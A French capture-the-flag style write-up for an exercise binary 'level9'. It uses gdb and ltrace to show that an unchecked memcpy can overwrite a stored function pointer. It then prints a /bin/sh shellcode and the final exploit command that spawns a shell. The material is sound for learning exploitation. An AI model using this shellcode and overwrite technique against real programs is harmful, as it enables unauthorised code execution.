# `memcpy` Exploitation

En décompilant l'exécutable, on remarque qu'il fait appel à le fonction `memcpy` et qu'il fait appel à l'adresse d'une fonction enregistrée dans la mémoire. Nous avons l'intuitions que nous allons devoir utiliser cet appel fonction pour faire appel à une fonction de notre choix.

Avec `gdb`, on remarque que l'appel à la fonction stockée en mémoire est en fait une instruction `call` à l'adresse pointée par `edx`.
```
> gdb --args level9 "AAAA"
[...]
> (gdb) disas main
[...]
   0x08048693 <+159>:	call   *%edx
[...]
```
On remarque que `edx` est assigné juste après l'appel à la fonction `setAnnotation`.
```
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
```
On constate ici in `mov` de `esp+0x10` dans `eax`. Puis un `move` de `eax` dans `edx`. Cela revient à dire qu'on `move` `esp+0x10` dans `edx`. Voyons où pointe `esp+0x10` et imprimons le contenu de cette adresse pour le visualiser plus tard dans la mémoire.
```
> (gdb) x $esp+0x10
0xbffff6a0:	0x0804a078
> (gdb) x 0x0804a078
0x804a078:	0x0804a00c
```
`esp+0x10` pointe donc sur à l'adresse `0x0804a078`.

> Il est important de noter que `edx` pointe désormais sur une adresse, qui contient l'adresse de la fonction. Cette information est importante à retenir pour la suite.

Mettons cette information de côté, et observons à présent notre `memcpy`. Déterminons tout d'abord l'endroit de la copie en mémoire. Pour cela, on peut, comment l'exercice précédent, utiliser `ltrace`.
```
> ltrace ./level9 "AAAA"
[...]
memcpy(0x0804a00c, "AAAA", 4)                                             = 0x0804a00c
[...]
```
`memcpy` copie donc à l'adresse `0x0804a00c`.

On remarque que l'adresse pointée par `esp+0x10` et l'adresse de copie de `memcpy` semblent être assez proches. On devrait donc pouvoir utiliser l'appel à le fonction `memcpy` pour écraser l'adresse pointée par `esp+0x10` par une adresse que nous définirons. Vérifions le en le visualisant. On `break` à l'instruction suivant l'appel à `memcpy`.
```
> (gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.
> (gdb) b *0x08048738
Breakpoint 1 at 0x8048738
> (gdb) r
Starting program: /home/user/level9/level9 AAAA

Breakpoint 1, 0x08048738 in N::setAnnotation(char*) ()
> (gdb) x/30wx 0x0804a00c
0x804a00c:	0x41414141	0x00000000	0x00000000	0x00000000
            ^
            AAAA
0x804a01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
                                                ^
                                                esp+0x10
0x804a07c:	0x00000000	0x00000000
```
Nos hypothèses sont confirmées. Le décalage entre les deux adresses semble assez grand pour injecter un `shell code`. Nous utiliserons celui-ci :
```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```
Rappelons-nous, l'adresse à écraser doit pointer sur une adresse contenant l'adresse du début de notre `shell code`. C'est un point important car on ne peut pas effectuer un `jump` directement sur notre `shell code`. Voici donc la façon dont nous allons remplir notre `buffer` :
```
[adresse_du_shell_code] + [shell_code] + [NOP] + [adresse_pointeur_shell_code]
^                         ^                      ^
4 octets                  45 octets              4 octets
```
L'`adresse_pointeur_shell_code` pointe en fait sur l'adresse de `adresse_du_shell_code`.

Pour connaitre le nombre d'instructions `NOP` à insérer, il nous faut connaitre au préalable le décalage entre l'adresse de copie de `memcpy` et `esp+0x10`.
```
offset = esp+0x10 - adresse_copie_memcpy + 0x04
       = 0x804A078 - 0x804a00c + 0x04
       = 70
       = 112 (base 10)
```
```
NOP = 112 - 4 - 45 - 4
    = 59
```
Nous aurons donc besoin d'insérer `59` instructions `NOP`.

Il est facile ensuite de déterminer `adresse_du_shell_code` et `adresse_pointeur_shell_code` en visualisant la mémoire. Reprenons notre visualisation mémoire avec la copie de nos caractères `AAAA` :
```
0x804a00c:	0x41414141	0x00000000	0x00000000	0x00000000
            ^           ^
            adresse     shell code
            shell code
0x804a01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
                                                ^
                                                adresse pointeur
                                                shell code
0x804a07c:	0x00000000	0x00000000
```
Autrement dit :
```
adresse_shell_code = adresse_copie_memcpy + 0x04
                   = 0x804a00c + 0x04
                   = 0x804A010
```
```
adresse_pointeur_shell_code = adresse_copie_memcpy
                            = 0x804a00c
```
Nous pouvons donc créer notre commande que nous fournirons en argument du programme.
```
python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90"*59 + "\x0c\xa0\x04\x08"'
```
```
./level9 `python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90"*59 + "\x0c\xa0\x04\x08"'`
```
